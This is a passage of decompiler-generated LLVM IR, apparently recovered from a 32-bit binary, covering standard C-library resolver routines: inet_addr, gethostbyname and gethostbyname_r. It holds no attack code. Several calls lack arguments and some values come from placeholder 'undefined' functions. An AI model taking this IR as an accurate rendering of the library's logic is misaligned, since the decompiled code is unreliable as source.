  %v3_1000f5e0 = call i32 @__GI_inet_ntoa_r(i32* nonnull %stack_var_-8, i32 ptrtoint (i32* @global_var_1002e870.646 to i32))
  ret i32 %v3_1000f5e0
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000f5fc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000f5fc, i32* @r4, align 4
  store i32 268498440, i32* @lr, align 4
  %v1_1000f604 = bitcast i32* %stack_var_-24 to i8*
  %v2_1000f604 = call i32 @inet_aton(i8* %v1_1000f604)
  %v3_1000f608 = icmp eq i32 %v2_1000f604, 0
  br i1 %v3_1000f608, label %dec_label_pc_1000f618, label %dec_label_pc_1000f614

dec_label_pc_1000f614:                            ; preds = %entry
  %v3_1000f614 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000f618

dec_label_pc_1000f618:                            ; preds = %entry, %dec_label_pc_1000f614
  %v0_1000f624 = phi i32 [ -1, %entry ], [ %v3_1000f614, %dec_label_pc_1000f614 ]
  ret i32 %v0_1000f624

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000f618, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v0_1000f63c = call i32 @__GI___h_errno_location()
  %v2_1000f64c = ptrtoint i32* %stack_var_-40 to i32
  store i32 268498532, i32* @lr, align 4
  %v7_1000f660 = call i32 @gethostbyname_r(i32 %arg1, i32* nonnull @global_var_1002ea4c.647, i32 ptrtoint (i32* @global_var_1002e880.648 to i32), i32 460, i32 %v2_1000f64c, i32 %v0_1000f63c)
  %v3_1000f668 = load i32, i32* %stack_var_-40, align 4
  ret i32 %v3_1000f668
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v0_1000f680 = load i32, i32* @lr, align 4
  store i32 %v0_1000f680, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r23, align 4
  %v3_1000f688 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r31, align 4
  store i32 %arg5, i32* %r20.global-to-local, align 4
  store i32 %tmp, i32* %r26.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  store i32 %arg4, i32* %r29.global-to-local, align 4
  store i32 %arg6, i32* @r24, align 4
  %v2_1000f6a8 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_1000f6a8, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  br i1 %v3_1000f688, label %dec_label_pc_1000f9ac, label %dec_label_pc_1000f6b4

dec_label_pc_1000f6b4:                            ; preds = %entry
  %v0_1000f6b4 = call i32 @__errno_location()
  store i32 %v0_1000f6b4, i32* %r3.global-to-local, align 4
  %v1_1000f6bc = inttoptr i32 %v0_1000f6b4 to i32*
  %v2_1000f6bc = load i32, i32* %v1_1000f6bc, align 4
  store i32 %v2_1000f6bc, i32* @r27, align 4
  store i32 %v0_1000f6b4, i32* %r28.global-to-local, align 4
  %v0_1000f6c4 = load i32, i32* @r31, align 4
  store i32 %v0_1000f6c4, i32* %v1_1000f6bc, align 4
  %v0_1000f6c8 = load i32, i32* %r26.global-to-local, align 4
  %v0_1000f6cc = load i32, i32* @r23, align 4
  store i32 %v0_1000f6cc, i32* %r3.global-to-local, align 4
  %v0_1000f6d0 = load i32, i32* %r30.global-to-local, align 4
  %v0_1000f6d4 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000f6d8 = load i32, i32* %r20.global-to-local, align 4
  %v0_1000f6dc = load i32, i32* @r24, align 4
  store i32 268498660, i32* @lr, align 4
  %v7_1000f6e0 = call i32 @__get_hosts_byname_r(i32 %v0_1000f6cc, i32 2, i32 %v0_1000f6c8, i32 %v0_1000f6d0, i32 %v0_1000f6d4, i32 %v0_1000f6d8, i32 %v0_1000f6dc)
  store i32 %v7_1000f6e0, i32* %r3.global-to-local, align 4
  %v3_1000f6e4 = icmp eq i32 %v7_1000f6e0, 0
  br i1 %v3_1000f6e4, label %dec_label_pc_1000f9ac, label %dec_label_pc_1000f6ec

dec_label_pc_1000f6ec:                            ; preds = %dec_label_pc_1000f6b4
  %v0_1000f6ec = load i32, i32* @r24, align 4
  %v1_1000f6ec = inttoptr i32 %v0_1000f6ec to i32*
  %v2_1000f6ec = load i32, i32* %v1_1000f6ec, align 4
  store i32 %v2_1000f6ec, i32* %r0.global-to-local, align 4
  %v3_1000f6f0 = icmp eq i32 %v2_1000f6ec, 1
  br i1 %v3_1000f6f0, label %dec_label_pc_1000f714, label %dec_label_pc_1000f6f8

dec_label_pc_1000f6f8:                            ; preds = %dec_label_pc_1000f6ec
  %v3_1000f6f8 = icmp eq i32 %v2_1000f6ec, 4
  br i1 %v3_1000f6f8, label %dec_label_pc_1000f714, label %dec_label_pc_1000f700

dec_label_pc_1000f700:                            ; preds = %dec_label_pc_1000f6f8
  %v3_1000f700 = icmp eq i32 %v2_1000f6ec, -1
  br i1 %v3_1000f700, label %dec_label_pc_1000f708, label %dec_label_pc_1000f9ac

dec_label_pc_1000f708:                            ; preds = %dec_label_pc_1000f700
  %v0_1000f708 = load i32, i32* @r28, align 4
  %v1_1000f708 = inttoptr i32 %v0_1000f708 to i32*
  %v2_1000f708 = load i32, i32* %v1_1000f708, align 4
  store i32 %v2_1000f708, i32* %r0.global-to-local, align 4
  %v3_1000f70c = icmp eq i32 %v2_1000f708, 2
  br i1 %v3_1000f70c, label %dec_label_pc_1000f714, label %dec_label_pc_1000f9ac

dec_label_pc_1000f714:                            ; preds = %dec_label_pc_1000f708, %dec_label_pc_1000f6f8, %dec_label_pc_1000f6ec
  %v0_1000f714 = load i32, i32* @r30, align 4
  %v1_1000f714 = sub i32 0, %v0_1000f714
  store i32 %v1_1000f714, i32* %r0.global-to-local, align 4
  %v0_1000f718 = load i32, i32* @r27, align 4
  %v1_1000f718 = load i32, i32* @r28, align 4
  %v2_1000f718 = inttoptr i32 %v1_1000f718 to i32*
  store i32 %v0_1000f718, i32* %v2_1000f718, align 4
  %v0_1000f71c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f71c = urem i32 %v0_1000f71c, 4
  store i32 %v1_1000f71c, i32* %r0.global-to-local, align 4
  %v3_1000f71c = icmp eq i32 %v1_1000f71c, 0
  %v0_1000f734.pre = load i32, i32* @r29, align 4
  br i1 %v3_1000f71c, label %dec_label_pc_1000f734, label %dec_label_pc_1000f724

dec_label_pc_1000f724:                            ; preds = %dec_label_pc_1000f714
  %v2_1000f724 = icmp ult i32 %v0_1000f734.pre, %v1_1000f71c
  br i1 %v2_1000f724, label %dec_label_pc_1000f9a8, label %dec_label_pc_1000f72c

dec_label_pc_1000f72c:                            ; preds = %dec_label_pc_1000f724
  %v2_1000f72c = sub i32 %v0_1000f734.pre, %v1_1000f71c
  store i32 %v2_1000f72c, i32* @r29, align 4
  %v0_1000f730 = load i32, i32* @r30, align 4
  %v2_1000f730 = add i32 %v0_1000f730, %v1_1000f71c
  store i32 %v2_1000f730, i32* @r30, align 4
  br label %dec_label_pc_1000f734

dec_label_pc_1000f734:                            ; preds = %dec_label_pc_1000f714, %dec_label_pc_1000f72c
  %v0_1000f734 = phi i32 [ %v2_1000f72c, %dec_label_pc_1000f72c ], [ %v0_1000f734.pre, %dec_label_pc_1000f714 ]
  %v1_1000f73c = load i32, i32* @r24, align 4
  %v2_1000f73c = inttoptr i32 %v1_1000f73c to i32*
  store i32 -1, i32* %v2_1000f73c, align 4
  %tmp29 = icmp ult i32 %v0_1000f734, 4
  br i1 %tmp29, label %dec_label_pc_1000f9a8, label %dec_label_pc_1000f744

dec_label_pc_1000f744:                            ; preds = %dec_label_pc_1000f734
  %v0_1000f744 = load i32, i32* @r29, align 4
  %v1_1000f744 = add i32 %v0_1000f744, -4
  store i32 %v1_1000f744, i32* %r0.global-to-local, align 4
  %tmp30 = icmp ult i32 %v1_1000f744, 8
  br i1 %tmp30, label %dec_label_pc_1000f9a8, label %dec_label_pc_1000f750

dec_label_pc_1000f750:                            ; preds = %dec_label_pc_1000f744
  %v1_1000f750 = add i32 %v0_1000f744, -12
  store i32 %v1_1000f750, i32* %r0.global-to-local, align 4
  %v0_1000f754 = load i32, i32* @r30, align 4
  %v1_1000f754 = add i32 %v0_1000f754, 4
  store i32 %v1_1000f754, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  %v3_1000f760 = inttoptr i32 %v1_1000f754 to i32*
  store i32 %v0_1000f754, i32* %v3_1000f760, align 4
  %v0_1000f764 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f764 = load i32, i32* %r25.global-to-local, align 4
  %v2_1000f764 = add i32 %v1_1000f764, 4
  %v3_1000f764 = inttoptr i32 %v2_1000f764 to i32*
  store i32 %v0_1000f764, i32* %v3_1000f764, align 4
  %tmp31 = icmp ult i32 %v1_1000f750, 32
  br i1 %tmp31, label %dec_label_pc_1000f9a8, label %dec_label_pc_1000f76c

dec_label_pc_1000f76c:                            ; preds = %dec_label_pc_1000f750
  %v0_1000f76c = load i32, i32* @r29, align 4
  %v1_1000f76c = add i32 %v0_1000f76c, -44
  %tmp32 = icmp ult i32 %v1_1000f76c, 256
  br i1 %tmp32, label %dec_label_pc_1000f9a8, label %dec_label_pc_1000f778

dec_label_pc_1000f778:                            ; preds = %dec_label_pc_1000f76c
  %v0_1000f778 = load i32, i32* @r30, align 4
  %v1_1000f778 = add i32 %v0_1000f778, 44
  store i32 %v1_1000f778, i32* @r31, align 4
  %v0_1000f77c = load i32, i32* @r23, align 4
  store i32 %v0_1000f77c, i32* @r4, align 4
  %v1_1000f784 = add i32 %v0_1000f778, 12
  store i32 %v1_1000f784, i32* %r21.global-to-local, align 4
  store i32 %v1_1000f778, i32* %r3.global-to-local, align 4
  store i32 268498832, i32* @lr, align 4
  %v3_1000f78c = call i32 @strncpy(i32 %v1_1000f778, i32 %v0_1000f77c, i32 %v1_1000f76c)
  %v0_1000f790 = load i32, i32* @r31, align 4
  %v1_1000f790 = load i32, i32* @r30, align 4
  %v2_1000f790 = add i32 %v1_1000f790, 12
  %v3_1000f790 = inttoptr i32 %v2_1000f790 to i32*
  store i32 %v0_1000f790, i32* %v3_1000f790, align 4
  %v0_1000f794 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f794 = load i32, i32* %r21.global-to-local, align 4
  %v2_1000f794 = add i32 %v1_1000f794, 4
  %v3_1000f794 = inttoptr i32 %v2_1000f794 to i32*
  store i32 %v0_1000f794, i32* %v3_1000f794, align 4
  %v0_1000f798 = load i32, i32* @r23, align 4
  store i32 %v0_1000f798, i32* %r3.global-to-local, align 4
  %v0_1000f79c = load i32, i32* @r30, align 4
  store i32 %v0_1000f79c, i32* @r4, align 4
  store i32 268498852, i32* @lr, align 4
  %v2_1000f7a0 = inttoptr i32 %v0_1000f798 to i8*
  %v3_1000f7a0 = call i32 @inet_aton(i8* %v2_1000f7a0)
  store i32 %v3_1000f7a0, i32* %r3.global-to-local, align 4
  store i32 %v3_1000f7a0, i32* %r22.global-to-local, align 4
  %v3_1000f7a4 = icmp eq i32 %v3_1000f7a0, 0
  br i1 %v3_1000f7a4, label %dec_label_pc_1000f7d8, label %dec_label_pc_1000f7ac

dec_label_pc_1000f7ac:                            ; preds = %dec_label_pc_1000f778
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1000f7b4 = load i32, i32* @r26, align 4
  %v2_1000f7b4 = add i32 %v1_1000f7b4, 8
  %v3_1000f7b4 = inttoptr i32 %v2_1000f7b4 to i32*
  store i32 2, i32* %v3_1000f7b4, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1000f7bc = load i32, i32* @r31, align 4
  %v1_1000f7bc = load i32, i32* @r26, align 4
  %v2_1000f7bc = inttoptr i32 %v1_1000f7bc to i32*
  store i32 %v0_1000f7bc, i32* %v2_1000f7bc, align 4
  %v0_1000f7c0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000f7c0 = load i32, i32* @r26, align 4
  %v2_1000f7c0 = add i32 %v1_1000f7c0, 12
  %v3_1000f7c0 = inttoptr i32 %v2_1000f7c0 to i32*
  store i32 %v0_1000f7c0, i32* %v3_1000f7c0, align 4
  %v0_1000f7c4 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000f7c4 = load i32, i32* @r26, align 4
  %v2_1000f7c4 = add i32 %v1_1000f7c4, 16
  %v3_1000f7c4 = inttoptr i32 %v2_1000f7c4 to i32*
  store i32 %v0_1000f7c4, i32* %v3_1000f7c4, align 4
  %v0_1000f7c8 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000f7c8 = load i32, i32* @r26, align 4
  %v2_1000f7c8 = add i32 %v1_1000f7c8, 4
  %v3_1000f7c8 = inttoptr i32 %v2_1000f7c8 to i32*
  store i32 %v0_1000f7c8, i32* %v3_1000f7c8, align 4
  %v0_1000f7cc = load i32, i32* @r26, align 4
  %v1_1000f7cc = load i32, i32* @r20, align 4
  %v2_1000f7cc = inttoptr i32 %v1_1000f7cc to i32*
  store i32 %v0_1000f7cc, i32* %v2_1000f7cc, align 4
  %v0_1000f7d0 = load i32, i32* %r28.global-to-local, align 4
  %v1_1000f7d0 = load i32, i32* @r24, align 4
  %v2_1000f7d0 = inttoptr i32 %v1_1000f7d0 to i32*
  store i32 %v0_1000f7d0, i32* %v2_1000f7d0, align 4
  br label %dec_label_pc_1000f9ac

dec_label_pc_1000f7d8:                            ; preds = %dec_label_pc_1000f778
  store i32 268632064, i32* %r29.global-to-local, align 4
  store i32 268498912, i32* @lr, align 4
  %v0_1000f7dc = call i32 @__open_nameservers()
  store i32 ptrtoint (i32* @global_var_10028758.649 to i32), i32* %r29.global-to-local, align 4
  %v2_1000f7e4 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_1000f7e4, i32* %r28.global-to-local, align 4
  store i32 %v2_1000f7e4, i32* @r3, align 4
  %v0_1000f7f8 = call i32 @__pthread_return_void()
  store i32 ptrtoint (i32* @global_var_10028758.649 to i32), i32* %r3.global-to-local, align 4
  %v0_1000f800 = call i32 @__pthread_return_0()
  %v3_1000f808 = load i32, i32* @global_var_1002883c.650, align 4
  store i32 %v3_1000f808, i32* %r29.global-to-local, align 4
  store i32 %v2_1000f7e4, i32* @r3, align 4
  %v0_1000f814 = call i32 @__pthread_return_void()
  %v0_1000f81c = load i32, i32* @r23, align 4
  store i32 %v0_1000f81c, i32* %r3.global-to-local, align 4
  %v2_1000f82c = ptrtoint i32* %stack_var_-120 to i32
  %v2_1000f830 = ptrtoint i32* %stack_var_-100 to i32
  %v0_1000f834 = load i32, i32* %r22.global-to-local, align 4
  store i32 268499012, i32* @lr, align 4
  %v6_1000f840 = inttoptr i32 %v0_1000f81c to i8*
  %v7_1000f840 = call i32 @__dns_lookup(i8* %v6_1000f840, i32 1, i32 %v3_1000f808, i32 ptrtoint (i32* @global_var_1002eb38.651 to i32), i32 %v2_1000f82c, i32 %v2_1000f830)
  store i32 %v7_1000f840, i32* %r3.global-to-local, align 4
  %v1_1000f844 = icmp slt i32 %v7_1000f840, 0
  br i1 %v1_1000f844, label %dec_label_pc_1000f98c, label %dec_label_pc_1000f84c

dec_label_pc_1000f84c:                            ; preds = %dec_label_pc_1000f7d8
  store i32 %tmp19, i32* %r11.global-to-local, align 4
  %v1_1000f854 = add i32 %tmp19, 4
  %v2_1000f858 = mul i32 %v0_1000f834, %v1_1000f854
  %v1_1000f85c = add i32 %v2_1000f858, 256
  %v1_1000f860 = load i32, i32* @r27, align 4
  %v3_1000f860 = icmp ugt i32 %v1_1000f85c, %v1_1000f860
  br i1 %v3_1000f860, label %dec_label_pc_1000f868, label %dec_label_pc_1000f884

dec_label_pc_1000f868:                            ; preds = %dec_label_pc_1000f84c
  %v3_1000f868 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000f868, i32* @r3, align 4
  store i32 268499056, i32* @lr, align 4
  %v0_1000f86c = call i32 @free()
  %v3_1000f870 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000f870, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000f878.652 to i32), i32* @lr, align 4
  %v0_1000f874 = call i32 @free()
  store i32 34, i32* %r3.global-to-local, align 4
  %v0_1000f87c = load i32, i32* @r19, align 4
  %v1_1000f87c = load i32, i32* @r24, align 4
  %v2_1000f87c = inttoptr i32 %v1_1000f87c to i32*
  store i32 %v0_1000f87c, i32* %v2_1000f87c, align 4
  br label %dec_label_pc_1000f9ac

dec_label_pc_1000f884:                            ; preds = %dec_label_pc_1000f84c
  %v3_1000f884 = icmp eq i32 %v0_1000f834, 0
  br i1 %v3_1000f884, label %dec_label_pc_1000f884.dec_label_pc_1000f928_crit_edge, label %dec_label_pc_1000f88c

dec_label_pc_1000f884.dec_label_pc_1000f928_crit_edge: ; preds = %dec_label_pc_1000f884
  %v0_1000f930.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f928

dec_label_pc_1000f88c:                            ; preds = %dec_label_pc_1000f884
  %v2_1000f88c = mul i32 %v0_1000f834, %tmp19
  store i32 %v2_1000f88c, i32* @r5, align 4
  %v0_1000f890 = load i32, i32* @r30, align 4
  %v1_1000f890 = add i32 %v0_1000f890, 36
  store i32 %v1_1000f890, i32* %r3.global-to-local, align 4
  %v0_1000f894 = load i32, i32* @r31, align 4
  store i32 268499100, i32* @lr, align 4
  %v2_1000f898 = call i32 @memmove(i32 %v1_1000f890, i32 %v0_1000f894)
  store i32 %v2_1000f898, i32* %r3.global-to-local, align 4
  store i32 %v2_1000f88c, i32* %r0.global-to-local, align 4
  %v0_1000f8a8 = load i32, i32* @r30, align 4
  %v1_1000f8a8 = load i32, i32* @r31, align 4
  %v3_1000f8a8 = add i32 %v1_1000f8a8, %v2_1000f88c
  %v4_1000f8a8 = inttoptr i32 %v3_1000f8a8 to i32*
  store i32 %v0_1000f8a8, i32* %v4_1000f8a8, align 4
  %v0_1000f8ac = load i32, i32* @r31, align 4
  %v1_1000f8ac = load i32, i32* %r0.global-to-local, align 4
  %v2_1000f8ac = add i32 %v1_1000f8ac, %v0_1000f8ac
  store i32 %v2_1000f8ac, i32* @r25, align 4
  %v1_1000f8b4 = add i32 %v0_1000f834, -1
  store i32 %v1_1000f8b4, i32* %r11.global-to-local, align 4
  %v1_1000f8b8 = add i32 %v0_1000f834, 1
  %v2_1000f8bc = icmp sgt i32 %v1_1000f8b4, -1
  store i32 %v1_1000f8b8, i32* %ctr.global-to-local, align 4
  br i1 %v2_1000f8bc, label %dec_label_pc_1000f8ec.preheader, label %dec_label_pc_1000f8c8

dec_label_pc_1000f8c8:                            ; preds = %dec_label_pc_1000f88c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000f8ec.preheader

dec_label_pc_1000f8ec.preheader:                  ; preds = %dec_label_pc_1000f8c8, %dec_label_pc_1000f88c
  %v0_1000f8f46 = phi i32 [ 1, %dec_label_pc_1000f8c8 ], [ %v1_1000f8b8, %dec_label_pc_1000f88c ]
  %v1_1000f8ec3 = mul i32 %v1_1000f8b4, 4
  store i32 %v1_1000f8ec3, i32* %r0.global-to-local, align 4
  %v2_1000f8f05 = add i32 %v2_1000f8ac, %v1_1000f8ec3
  %v1_1000f8f47 = add i32 %v0_1000f8f46, -1
  store i32 %v1_1000f8f47, i32* %ctr.global-to-local, align 4
  %v2_1000f8f48 = icmp eq i32 %v1_1000f8f47, 0
  br i1 %v2_1000f8f48, label %dec_label_pc_1000f8f8, label %dec_label_pc_1000f8d4

dec_label_pc_1000f8d4:                            ; preds = %dec_label_pc_1000f8ec.preheader, %dec_label_pc_1000f8d4.dec_label_pc_1000f8d4_crit_edge
  %v1_1000f8e8 = phi i32 [ %v2_1000f8f0, %dec_label_pc_1000f8d4.dec_label_pc_1000f8d4_crit_edge ], [ %v2_1000f8f05, %dec_label_pc_1000f8ec.preheader ]
  %v0_1000f8e0 = phi i32 [ %v0_1000f8e0.pre, %dec_label_pc_1000f8d4.dec_label_pc_1000f8d4_crit_edge ], [ %v0_1000f8ac, %dec_label_pc_1000f8ec.preheader ]
  %v0_1000f8d8 = phi i32 [ %v0_1000f8ec, %dec_label_pc_1000f8d4.dec_label_pc_1000f8d4_crit_edge ], [ %v1_1000f8b4, %dec_label_pc_1000f8ec.preheader ]
  %v2_1000f8d8 = mul i32 %v0_1000f8d8, %tmp19
  %v1_1000f8dc = add i32 %v0_1000f8d8, -1
  store i32 %v1_1000f8dc, i32* %r11.global-to-local, align 4
  %v2_1000f8e0 = add i32 %v0_1000f8e0, -8
  %v1_1000f8e4 = add i32 %v2_1000f8e0, %v2_1000f8d8
  %v2_1000f8e8 = add i32 %v1_1000f8e8, 4
  %v3_1000f8e8 = inttoptr i32 %v2_1000f8e8 to i32*
  store i32 %v1_1000f8e4, i32* %v3_1000f8e8, align 4
  %v0_1000f8ec = load i32, i32* %r11.global-to-local, align 4
  %v1_1000f8ec = mul i32 %v0_1000f8ec, 4
  store i32 %v1_1000f8ec, i32* %r0.global-to-local, align 4
  %v1_1000f8f0 = load i32, i32* @r25, align 4
  %v0_1000f8f4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000f8f4 = add i32 %v0_1000f8f4, -1
  store i32 %v1_1000f8f4, i32* %ctr.global-to-local, align 4
  %v2_1000f8f4 = icmp eq i32 %v1_1000f8f4, 0
  br i1 %v2_1000f8f4, label %dec_label_pc_1000f8f8, label %dec_label_pc_1000f8d4.dec_label_pc_1000f8d4_crit_edge

dec_label_pc_1000f8d4.dec_label_pc_1000f8d4_crit_edge: ; preds = %dec_label_pc_1000f8d4
  %v2_1000f8f0 = add i32 %v1_1000f8f0, %v1_1000f8ec
  %v0_1000f8e0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_1000f8d4

dec_label_pc_1000f8f8:                            ; preds = %dec_label_pc_1000f8d4, %dec_label_pc_1000f8ec.preheader
  %v1_1000f904 = phi i32 [ %v2_1000f8ac, %dec_label_pc_1000f8ec.preheader ], [ %v1_1000f8f0, %dec_label_pc_1000f8d4 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1000f900 = mul i32 %v0_1000f834, 4
  %v2_1000f904 = add i32 %v1_1000f900, 4
  %v2_1000f908 = add i32 %v2_1000f904, %v1_1000f904
  %v3_1000f908 = inttoptr i32 %v2_1000f908 to i32*
  store i32 0, i32* %v3_1000f908, align 4
  %v0_1000f914 = load i32, i32* @r25, align 4
  %v2_1000f914 = add i32 %v0_1000f914, %v1_1000f900
  store i32 %v2_1000f914, i32* %r11.global-to-local, align 4
  %v1_1000f918 = load i32, i32* @r31, align 4
  %v2_1000f918 = sub i32 %v1_1000f918, %v2_1000f914
  %v1_1000f91c = add i32 %v2_1000f914, 8
  store i32 %v1_1000f91c, i32* @r31, align 4
  %v0_1000f920 = load i32, i32* @r27, align 4
  %v2_1000f920 = add i32 %v0_1000f920, %v2_1000f918
  %v1_1000f924 = add i32 %v2_1000f920, -8
  br label %dec_label_pc_1000f928

dec_label_pc_1000f928:                            ; preds = %dec_label_pc_1000f884.dec_label_pc_1000f928_crit_edge, %dec_label_pc_1000f8f8
  %v0_1000f930 = phi i32 [ %v0_1000f930.pre, %dec_label_pc_1000f884.dec_label_pc_1000f928_crit_edge ], [ %v1_1000f91c, %dec_label_pc_1000f8f8 ]
  %v0_1000f92c = phi i32 [ %v1_1000f860, %dec_label_pc_1000f884.dec_label_pc_1000f928_crit_edge ], [ %v1_1000f924, %dec_label_pc_1000f8f8 ]
  %v3_1000f928 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000f928, i32* @r4, align 4
  store i32 %v0_1000f930, i32* %r3.global-to-local, align 4
  store i32 268499256, i32* @lr, align 4
  %v3_1000f934 = call i32 @strncpy(i32 %v0_1000f930, i32 %v3_1000f928, i32 %v0_1000f92c)
  %v3_1000f938 = load i32, i32* %stack_var_-100, align 4
  store i32 %v3_1000f938, i32* @r3, align 4
  store i32 268499264, i32* @lr, align 4
  %v0_1000f93c = call i32 @free()
  store i32 %v0_1000f93c, i32* %r3.global-to-local, align 4
  store i32 %tmp18, i32* %r0.global-to-local, align 4
  %v3_1000f944 = icmp eq i32 %tmp18, 1
  br i1 %v3_1000f944, label %dec_label_pc_1000f94c, label %dec_label_pc_1000f994

dec_label_pc_1000f94c:                            ; preds = %dec_label_pc_1000f928
  store i32 4, i32* @r5, align 4
  %v0_1000f954 = load i32, i32* @r30, align 4
  store i32 %v0_1000f954, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000f95c.653 to i32), i32* @lr, align 4
  %v0_1000f958 = call i32 @memcpy()
  %v1_1000f960 = load i32, i32* @r26, align 4
  %v2_1000f960 = add i32 %v1_1000f960, 8
  %v3_1000f960 = inttoptr i32 %v2_1000f960 to i32*
  store i32 2, i32* %v3_1000f960, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1000f968 = load i32, i32* @r26, align 4
  %v2_1000f968 = add i32 %v1_1000f968, 12
  %v3_1000f968 = inttoptr i32 %v2_1000f968 to i32*
  store i32 4, i32* %v3_1000f968, align 4
  %v0_1000f96c = load i32, i32* @r31, align 4
  %v1_1000f96c = load i32, i32* @r26, align 4
  %v2_1000f96c = inttoptr i32 %v1_1000f96c to i32*
  store i32 %v0_1000f96c, i32* %v2_1000f96c, align 4
  %v0_1000f970 = load i32, i32* @r25, align 4
  %v1_1000f970 = load i32, i32* @r26, align 4
  %v2_1000f970 = add i32 %v1_1000f970, 16
  %v3_1000f970 = inttoptr i32 %v2_1000f970 to i32*
  store i32 %v0_1000f970, i32* %v3_1000f970, align 4
  %v0_1000f974 = load i32, i32* @r21, align 4
  %v1_1000f974 = load i32, i32* @r26, align 4
  %v2_1000f974 = add i32 %v1_1000f974, 4
  %v3_1000f974 = inttoptr i32 %v2_1000f974 to i32*
  store i32 %v0_1000f974, i32* %v3_1000f974, align 4
  %v3_1000f978 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000f978, i32* @r3, align 4
  store i32 268499328, i32* @lr, align 4
  %v0_1000f97c = call i32 @free()
  store i32 %v0_1000f97c, i32* %r3.global-to-local, align 4
  %v0_1000f980 = load i32, i32* @r26, align 4
  %v1_1000f980 = load i32, i32* @r20, align 4
  %v2_1000f980 = inttoptr i32 %v1_1000f980 to i32*
  store i32 %v0_1000f980, i32* %v2_1000f980, align 4
  br label %dec_label_pc_1000f98c

dec_label_pc_1000f98c:                            ; preds = %dec_label_pc_1000f994, %dec_label_pc_1000f7d8, %dec_label_pc_1000f94c
  %storemerge1 = phi i32 [ 0, %dec_label_pc_1000f94c ], [ 2, %dec_label_pc_1000f7d8 ], [ 2, %dec_label_pc_1000f994 ]
  %storemerge = phi i32 [ 0, %dec_label_pc_1000f94c ], [ 1, %dec_label_pc_1000f7d8 ], [ 1, %dec_label_pc_1000f994 ]
  store i32 %storemerge1, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v1_1000f98c = load i32, i32* @r24, align 4
  %v2_1000f98c = inttoptr i32 %v1_1000f98c to i32*
  store i32 %storemerge, i32* %v2_1000f98c, align 4
  br label %dec_label_pc_1000f9ac

dec_label_pc_1000f994:                            ; preds = %dec_label_pc_1000f928
  %v3_1000f994 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_1000f994, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000f99c.654 to i32), i32* @lr, align 4
  %v0_1000f998 = call i32 @free()
  store i32 %v0_1000f998, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f98c

dec_label_pc_1000f9a8:                            ; preds = %dec_label_pc_1000f76c, %dec_label_pc_1000f750, %dec_label_pc_1000f744, %dec_label_pc_1000f734, %dec_label_pc_1000f724
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000f9ac

dec_label_pc_1000f9ac:                            ; preds = %dec_label_pc_1000f708, %dec_label_pc_1000f700, %dec_label_pc_1000f6b4, %entry, %dec_label_pc_1000f98c, %dec_label_pc_1000f868, %dec_label_pc_1000f7ac, %dec_label_pc_1000f9a8
  store i32 %v0_1000f680, i32* %r0.global-to-local, align 4
  %v0_1000f9bc = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1000f9bc

; uselistorder directives
  uselistorder i32 %v0_1000f930, { 1, 0 }
  uselistorder i32 %v1_1000f900, { 1, 0 }
  uselistorder i32 %v1_1000f8f4, { 1, 0 }
  uselistorder i32 %v1_1000f8ec, { 1, 0 }
  uselistorder i32 %v0_1000f8d8, { 1, 0 }
  uselistorder i32 %v1_1000f8ec3, { 1, 0 }
